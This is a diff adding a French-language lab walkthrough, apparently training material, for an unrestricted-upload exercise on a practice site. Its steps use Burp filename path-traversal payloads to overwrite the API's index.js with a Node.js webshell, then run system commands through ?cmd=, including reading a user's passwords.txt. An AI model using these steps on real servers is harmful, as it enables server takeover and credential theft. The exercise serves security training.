@@ -1006,7 +1006,203 @@ run
 </ol>
 
   </div>
-  <div id="s11" class="content"><div class="section-title">XI. NodeJS Upload – Advanced</div></div>
+  <div id="s11" class="content"><div class="section-title">XI. NodeJS Upload – Advanced</div>
+  <h3>📤 Trouver l’Upload de Fichier Non Restreint</h3>
+
+<p>
+  Rendez-vous sur le site <b>Angels & Scooters</b> et créez un compte utilisateur.  
+  Accédez ensuite à la page <b>Profile</b> pour téléverser une photo de profil.
+</p>
+
+<p>
+  Cliquez sur <b>Choose File</b> et sélectionnez une image.  
+  Un exemple d’image, <code>banana.png</code>, se trouve dans :
+</p>
+
+<pre><code>/root/Pictures/banana.png</code></pre>
+
+<p>
+  Après l’upload, faites un clic droit sur la nouvelle image puis choisissez  
+  <b>Open image in new tab</b> ou <b>Copy image address</b>.
+</p>
+
+<p>
+  Exemple d’URL si vous avez uploadé <code>banana.png</code> :
+</p>
+
+<pre><code>https://angelsscooters.lab/api/public/uploads/users/banana.png</code></pre>
+
+<hr>
+
+<h3>📄 Upload de fichiers non-images</h3>
+
+<p>
+  Essayez maintenant d'uploader un fichier JavaScript, par exemple :
+</p>
+
+<pre><code>/root/Desktop/index.js</code></pre>
+
+<p>
+  L’upload réussit également.  
+  Vous trouverez le fichier ici :
+</p>
+
+<pre><code>https://angelsscooters.lab/api/public/uploads/users/index.js</code></pre>
+
+<p>
+  Cela prouve que le serveur accepte <b>tous les types de fichiers</b>, pas seulement les images.
+</p>
+
+<hr>
+
+<h3>🔁 Tester la possibilité d’écraser un fichier</h3>
+
+<p>Créez un fichier portant le même nom qu’une image déjà uploadée :</p>
+
+<pre><code>echo 'test' > banana.png</code></pre>
+
+<p>
+  Uploadez ce nouveau fichier et vérifiez si le fichier original a été écrasé.
+</p>
+
+<hr>
+
+<h3>📂 Emplacement des fichiers uploadés</h3>
+
+<p>
+  Exemple d’accès :
+</p>
+
+<pre><code>https://angelsscooters.lab/api/public/uploads/entries/banana.png</code></pre>
+
+<p>
+  Ce fichier correspond au chemin relatif :
+</p>
+
+<pre><code>api/public/uploads/entries/banana.png</code></pre>
+
+<p>
+  Pour un fichier uploadé dans les utilisateurs :
+</p>
+
+<pre><code>https://angelsscooters.lab/api/public/uploads/users/banana.png</code></pre>
+
+<hr>
+
+<h3>⚙️ Préparer un fichier malveillant</h3>
+
+<p>Le code suivant montre :</p>
+<ul>
+  <li>qu’un serveur web Node.js tourne,</li>
+  <li>qu’il exécute des commandes système via <code>exec()</code>,</li>
+  <li>et qu'il traite un paramètre <code>?cmd=</code>.</li>
+</ul>
+
+<pre><code>const host = '0.0.0.0';
+const port = 3000;
+const server = http.createServer((req, res) => {
+  // code omitted
+});
+server.listen(port, host, () => {
+  console.log(`Server running.`);
+});
+</code></pre>
+
+<p><b>Exécution de commandes :</b></p>
+
+<pre><code>const { exec } = require('child_process');
+exec(query.cmd, (err, stdout, stderr) => {
+  // code omitted
+});
+</code></pre>
+
+<p><b>Condition d’exécution :</b></p>
+
+<pre><code>if (query.cmd) {
+  exec(query.cmd, (err, stdout, stderr) => {
+    // code omitted
+  });
+}
+</code></pre>
+
+<hr>
+
+<h3>🧭 Path Traversal</h3>
+
+<p>
+  Vérifiez d'abord que le fichier suivant n'existe pas :
+</p>
+
+<pre><code>http://angelsscooters.lab/api/public/uploads/competitions/index.js</code></pre>
+
+<p>
+  Ouvrez <b>Burp Suite</b>, puis Firefox via le raccourci  
+  <b>Angels&Scooters (Burp Suite)</b> sur votre Desktop.  
+  Firefox est déjà configuré pour utiliser Burp comme proxy.
+</p>
+
+<p>
+  Connectez-vous au site, allez dans <b>Profile</b> puis activez <b>Intercept ON</b> dans Burp.
+</p>
+
+<p>
+  Uploadez <code>index.js</code>. Burp interceptera la requête.  
+  Modifiez le champ <b>filename</b> en :
+</p>
+
+<pre><code>../competitions/index.js</code></pre>
+
+<p>
+  Envoyez la requête.  
+  Vérifiez ensuite :
+</p>
+
+<pre><code>http://angelsscooters.lab/api/public/uploads/competitions/index.js</code></pre>
+
+<p>
+  Si le fichier apparaît, la vulnérabilité de <b>path traversal</b> est confirmée.
+</p>
+
+<hr>
+
+<h3>🚨 Overwrite du fichier index.js</h3>
+
+<p>
+  Pour écraser <b>api/index.js</b>, qui se trouve trois niveaux au-dessus de  
+  <code>api/public/uploads/users</code>, modifiez le nom du fichier dans Burp :
+</p>
+
+<pre><code>../../../index.js</code></pre>
+
+<p>
+  Si l’opération réussit, vous venez d’écraser le fichier principal de l’API.
+</p>
+
+<hr>
+
+<h3>💻 Utilisation du WebShell</h3>
+
+<p>
+  Si vous avez correctement écrasé <code>index.js</code>, votre webshell est accessible ici :
+</p>
+
+<pre><code>http://angelscooters.lab/api/?cmd=whoami</code></pre>
+
+<p>
+  Tout ce qui suit <code>?cmd=</code> sera exécuté comme une commande système.
+</p>
+
+<p><b>Exemples :</b></p>
+
+<p>Voir le contenu du home de Davey :</p>
+
+<pre><code>cmd=ls%20%2Fhome%2Fdavey</code></pre>
+
+<p>Lire le fichier <code>passwords.txt</code> :</p>
+
+<pre><code>cmd=cat%20%2Fhome%2Fdavey%2Fpasswords.txt</code></pre>
+
+  </div>
   <div id="s12" class="content"><div class="section-title">XII. PHP Upload – Novice</div></div>
   <div id="s13" class="content"><div class="section-title">XIII. SUID – Advanced</div></div>
   <div id="s14" class="content"><div class="section-title">XIV. Metasploit – Advanced</div></div>
